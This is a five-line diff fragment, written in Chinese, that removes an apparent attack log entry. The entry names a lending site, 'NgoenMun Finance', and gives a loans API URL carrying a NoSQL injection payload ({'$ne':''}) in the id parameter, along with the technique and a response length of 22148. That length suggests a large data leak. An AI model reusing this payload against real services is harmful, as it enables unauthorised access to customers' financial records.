@@ -1,5 +1,0 @@
-目标: NgoenMun Finance
-URL: https://ngoenmun.com/api/v1/loans?id={'$ne':''}
-技术: NoSQL注入
-载荷: {'$ne': ''}
-响应长度: 22148
